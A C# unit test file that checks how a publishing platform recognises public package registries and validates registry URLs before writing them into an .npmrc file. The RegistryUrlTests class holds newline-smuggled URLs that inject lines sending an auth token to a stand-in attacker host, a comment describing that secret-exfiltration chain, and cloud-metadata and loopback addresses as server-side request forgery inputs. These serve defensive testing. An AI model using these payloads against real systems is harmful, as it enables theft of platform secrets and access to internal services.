using SpaceCraft.Domain.Projects;
using SpaceCraft.Domain.Registries;
using Shouldly;
using Xunit;

namespace SpaceCraft.UnitTests;

/// <summary>
/// Which endpoint a credential points at decides how its token is judged, so this is the
/// question the credential form's "private registry" switch ultimately asks.
/// </summary>
public class RegistryEndpointsTests
{
    [Theory]
    [InlineData("https://registry.npmjs.org")]
    [InlineData("https://registry.npmjs.org/")]
    [InlineData("https://REGISTRY.NPMJS.ORG")]
    // A scoped path is still npmjs: the host is what issues the token.
    [InlineData("https://registry.npmjs.org/@acme")]
    public void The_public_npm_registry_is_recognised_however_it_is_written(string url)
    {
        RegistryEndpoints.IsPublicFor(RegistryKind.Npm, url).ShouldBeTrue();
    }

    [Theory]
    [InlineData("http://verdaccio:4873")]
    [InlineData("https://nexus.example.test/repository/npm")]
    [InlineData("https://npm.acme.internal")]
    public void A_registry_an_organization_runs_is_not_the_public_one(string url)
    {
        // The distinction the token check rests on: npmjs issues npm_ tokens, and nothing
        // else does. Verdaccio hands out a 108-character base64 string.
        RegistryEndpoints.IsPublicFor(RegistryKind.Npm, url).ShouldBeFalse();
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("not a url")]
    [InlineData("registry.npmjs.org")]
    public void Nothing_that_is_not_an_absolute_url_counts_as_public(string? url)
    {
        RegistryEndpoints.IsPublicFor(RegistryKind.Npm, url).ShouldBeFalse();
    }

    [Fact]
    public void Each_registry_is_measured_against_its_own_public_endpoint()
    {
        // npmjs is not PyPI's public registry, however public it is.
        RegistryEndpoints.IsPublicFor(RegistryKind.PyPI, "https://upload.pypi.org/legacy/").ShouldBeTrue();
        RegistryEndpoints.IsPublicFor(RegistryKind.PyPI, "https://registry.npmjs.org").ShouldBeFalse();
    }

    [Theory]
    [InlineData(RegistryKind.Npm)]
    [InlineData(RegistryKind.NuGet)]
    [InlineData(RegistryKind.PyPI)]
    public void A_registry_that_names_a_public_endpoint_recognises_it(RegistryKind registry)
    {
        // Guards the pairing rather than the values. Maven and Packagist are absent because
        // they name no address a publish can reach — see RegistryEndpoints.DefaultFor.
        RegistryEndpoints.IsPublicFor(registry, RegistryEndpoints.DefaultFor(registry)).ShouldBeTrue();
    }
}

/// <summary>
/// What a registry address is allowed to be, given where it ends up.
/// </summary>
/// <remarks>
/// It is written verbatim into the .npmrc the publish step reads, and npm expands
/// <c>${VAR}</c> in that file. A newline inside the address was therefore a config line of
/// the caller's choosing, in a process that inherited the platform's own secrets — the whole
/// chain being a credential whose URL named
/// <c>//attacker/:_authToken=${KeyProtection__SecretKey}</c>.
/// </remarks>
public class RegistryUrlTests
{
    [Theory]
    [InlineData("https://registry.npmjs.org")]
    [InlineData("https://registry.npmjs.org/")]
    [InlineData("https://npm.acme.internal:4873")]
    public void An_ordinary_address_is_accepted(string url) =>
        RegistryEndpoints.IsValid(url).ShouldBeTrue();

    [Theory]
    // The attack, exactly: Uri.TryCreate accepts this and reports Host = registry.npmjs.org.
    [InlineData("https://registry.npmjs.org/\nregistry=http://attacker.tld/")]
    [InlineData("https://registry.npmjs.org/\r\n//attacker.tld/:_authToken=x")]
    [InlineData("https://registry.npmjs.org/\ttoken=x")]
    [InlineData("https://registry.npmjs.org /")]
    public void An_address_carrying_anything_but_an_address_is_refused(string url) =>
        RegistryEndpoints.IsValid(url).ShouldBeFalse();

    [Theory]
    // Loopback and the cloud metadata address, spelled the ways the first filter missed.
    [InlineData("http://[::ffff:169.254.169.254]/")]
    [InlineData("http://[fd00::1]/")]
    [InlineData("http://0.0.0.0:9200/")]
    [InlineData("http://169.254.169.254/latest/meta-data")]
    [InlineData("http://127.0.0.1:5432/")]
    [InlineData("http://[::1]/")]
    [InlineData("http://10.0.0.5/")]
    public void An_address_inside_the_platform_is_recognised(string url) =>
        RegistryEndpoints.IsInternal(url).ShouldBeTrue(url);

    [Theory]
    [InlineData("https://registry.npmjs.org")]
    [InlineData("https://npm.acme.example.com")]
    public void A_public_address_is_not(string url) =>
        RegistryEndpoints.IsInternal(url).ShouldBeFalse(url);
}
